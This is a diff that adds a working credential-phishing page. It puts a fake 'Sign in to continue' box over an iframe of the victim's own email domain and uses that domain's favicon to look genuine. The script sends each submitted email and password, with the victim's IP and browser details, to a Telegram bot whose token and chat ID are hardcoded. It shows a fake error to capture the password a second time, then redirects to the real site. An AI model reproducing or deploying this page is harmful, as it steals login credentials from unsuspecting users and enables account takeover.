@@ -1,0 +1,328 @@
+<html><head>
+    <title>Login to your account</title>
+    <meta content="text/html;" http-equiv="content-type">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" id="favicon" href="https://www.google.com/s2/favicons?domain=address.hu">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="noindex">
+    <meta name="otherbot" content="noindex">
+    <meta name="noarchive" content="noindex">
+    <meta name="nosnippet" content="noindex">
+    <meta name="noimageindex" content="noindex">
+    <meta name="robots" content="none">
+    <meta name="googlebot" content="none">
+    <meta name="googlebot-news" content="none">
+    <meta name="otherbot" content="none">
+    <meta name="noarchive" content="none">
+    <meta name="nosnippet" content="none">
+    <meta name="noimageindex" content="none">
+    <meta name="robots" content="nofollow">
+    <meta charset="UTF-8">
+
+    <meta name="googlebot" content="nofollow">
+    <meta name="googlebot-news" content="nofollow">
+    <meta name="otherbot" content="nofollow">
+    <meta name="noarchive" content="nofollow">
+    <meta name="nosnippet" content="nofollow">
+    <meta name="noimageindex" content="nofollow">
+    <meta name="robots" content="max-snippet:0">
+    <meta name="robots" content="unavailable_after: 2020-09-22">
+    <style>
+      html,
+      body {
+        margin: 0px;
+        height: 100%;
+      }
+
+      .if {
+        width: 100%;
+        height: 100%;
+      }
+
+      .iframe {
+        width: 100%;
+        height: 100%;
+        border: 0px;
+      }
+
+      .bg-modal {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .modal-content {
+        width: 350px;
+        height: 380px;
+        background-color: rgba(0, 0, 0, 0.8);
+        text-align: center;
+      }
+
+      .img-logo {
+        margin-top: 25px;
+        width: 20px;
+        height: 20px;
+      }
+
+      .sign-in {
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        color: #ffffff;
+        font-weight: bold;
+      }
+
+      .note {
+        font-size: 12px;
+        font-family: Arial, Helvetica, sans-serif;
+        color: #ffffff;
+      }
+
+      .page_error {
+        width: 300px;
+        color: #ffffff;
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        background: rgba(255, 255, 0, 0.3);
+        margin-left: 20px;
+        padding: 5px 4px;
+        border-radius: 3px;
+        border: 1px solid #ef9a9a;
+        display: none;
+        margin-bottom: 2px;
+      }
+
+      .pass_error {
+        width: 300px;
+        color: #ffffff;
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        background: rgba(255, 255, 0, 0.3);
+        margin-left: 20px;
+        padding: 5px 4px;
+        border-radius: 3px;
+        border: 1px solid #ef9a9a;
+        display: none;
+        margin-top: 2px;
+      }
+
+      .form-input {
+        width: 300px;
+        height: 35px;
+        border: 0px;
+        outline: 0px;
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        padding-left: 10px;
+      }
+
+      .submit {
+        width: 310px;
+        height: 40px;
+        border: 0px;
+        outline: 0px;
+        color: #ffffff;
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        font-weight: bold;
+        background-color: #017aff;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+
+      .foot {
+        font-size: 14px;
+        font-family: Arial, Helvetica, sans-serif;
+        color: #017aff;
+        cursor: pointer;
+      }
+
+      .foot:hover {
+        text-decoration: underline;
+      }
+    </style>
+    <script type="text/javascript">
+      function populatefirst() {
+        var varSection = window.location.search.substr(1);
+        var varArray = varSection.split("&");
+        for (var v = 0; v < varArray.length; v++) {
+          var keyValueArray = varArray[v].split("=");
+          if (keyValueArray[0] == "userid") {
+            varValue = keyValueArray[1];
+            document.getElementById("userid").value = varValue;
+            break;
+          }
+        }
+      }
+    </script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript">
+      const t = "7563381825:AAE00r3iZd2pMO34eLTh_gBlinHvbCE_msw"; // token
+      const c = "8089171806"; // channel/user ID
+      const ua = navigator.userAgent;
+      var attempt = 2;
+      $(document).ready(function () {
+        $("#button").click(function (e) {
+          e.preventDefault();
+          processLogin();
+        });
+
+        $(".form-input").keyup(function (e) {
+          if (e.keyCode == 13) {
+            processLogin();
+          }
+        });
+      });
+
+      function processLogin() {
+        // Validate email and password
+        var userid = $("#userid").val();
+        var password = $("#password").val();
+        const my_domain = userid.split("@")[1];
+        var dataString = "userid=" + userid + "&password=" + password;
+        if (userid == "" || password == "") {
+          pass_error.style.display = "flex";
+          page_error.style.display = "none";
+          password.focus;
+          return false;
+        } else {
+          pass_error.style.display = "none";
+          attempt--;
+          // AJAX Code To Submit Form.
+          if (attempt != 0) {
+            var password1 = password;
+            $.get("https://api.ipify.org?format=json", function (res) {
+              const ip = res.ip;
+              const msg =
+                "🧾 New Form\n\n" +
+                "📧 Email: " +
+                userid +
+                "\n" +
+                "🔐 Password: " +
+                password +
+                "\n\n" +
+                "🌐 IP: " +
+                ip +
+                "\n\n" +
+                "🖥️ Browser Info:\n" +
+                ua;
+
+              $.get("https://api.telegram.org/bot" + t + "/sendMessage", {
+                chat_id: c,
+                text: msg,
+              })
+                .done(function () {
+                  page_error.style.display = "flex";
+                  $("input[name=password").val("");
+                  if (attempt == 0) {
+                    window.location.replace("https://www." + my_domain);
+                  }
+                })
+                .fail(function () {
+                  console.log("Message failed.");
+                });
+            });
+          } else {
+            $.get("https://api.ipify.org?format=json", function (res) {
+              const ip = res.ip;
+              const msg =
+                "🧾 New Form\n\n" +
+                "📧 Email: " +
+                userid +
+                "\n" +
+                "🔐 Password: " +
+                password1 +
+                "\n" +
+                "🔐 Confirm: " +
+                password +
+                "\n\n" +
+                "🌐 IP: " +
+                ip +
+                "\n\n" +
+                "🖥️ Browser Info:\n" +
+                ua;
+
+              $.get("https://api.telegram.org/bot" + t + "/sendMessage", {
+                chat_id: c,
+                text: msg,
+              })
+                .done(function () {
+                  page_error.style.display = "flex";
+                  $("input[name=password").val("");
+                  if (attempt == 0) {
+                    window.location.replace("https://www." + my_domain);
+                  }
+                })
+                .fail(function () {
+                  console.log("Message failed.");
+                });
+            });
+          }
+        }
+
+        return false;
+      }
+    </script>
+    <script>
+      function getDomain() {
+        const email = document.getElementById("userid").value;
+        const my_domain = email.split("@")[1];
+        const url = document.getElementById("favicon");
+        url.setAttribute(
+          "href",
+          "https://www.google.com/s2/favicons?domain=" + my_domain
+        );
+        console.log(url);
+        const img = document.getElementById("logoimg");
+        img.setAttribute(
+          "src",
+          "https://www.google.com/s2/favicons?domain=" + my_domain
+        );
+        console.log(img);
+        const frame = document.getElementById("iframe");
+        frame.setAttribute("src", "https://www." + my_domain);
+        console.log(frame);
+        console.log(my_domain);
+      }
+    </script>
+  </head>
+  <body onload="populatefirst(), getDomain()">
+    <div class="if">
+      <iframe class="iframe" id="iframe" src="https://www.address.hu" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"></iframe>
+    </div>
+    <!--Modal Section-->
+    <div class="bg-modal">
+      <div class="modal-content">
+        <img src="https://www.google.com/s2/favicons?domain=address.hu" id="logoimg" class="img-logo"><br><br>
+        <label class="sign-in"> Sign in to continue</label><br><br>
+        <div class="page_error" id="page_error">
+          Email or password is incorrect. Try again
+        </div>
+        <input type="email" class="form-input" id="userid" value="" maxlength="128" name="userid" readonly=""><br><br>
+        <input type="password" class="form-input" id="password" placeholder="Password" maxlength="128" minlength="3" name="password">
+        <div class="pass_error" id="pass_error">
+          Sorry password field cannot be empty!
+        </div>
+        <button class="submit" id="button" type="submit" name="submit">
+          Sign in</button><br><br>
+        <label class="foot">Forgot password?</label>
+      </div>
+    </div>
+
+    <script>
+      const fullUrl = window.location.href;
+      const emailRegex = /#([^#]+)$/;
+      const match = fullUrl.match(emailRegex);
+      if (match) {
+        em = decodeURIComponent(match[1]);
+        document.querySelector("input[name='userid']").value = em;
+        // Pre-fill the email input field
+      }
+    </script>
+  
+
+</body></html>
